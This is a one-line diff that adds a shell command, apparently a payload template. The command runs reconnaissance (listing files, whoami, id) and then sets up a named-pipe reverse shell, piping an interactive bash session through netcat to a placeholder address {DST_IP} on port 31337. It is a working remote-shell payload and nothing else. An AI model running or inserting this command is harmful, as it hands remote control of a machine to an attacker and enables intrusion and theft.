@@ -1,0 +1,1 @@
+ls -la;whoami;id -a;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {DST_IP} 31337 >/tmp/f
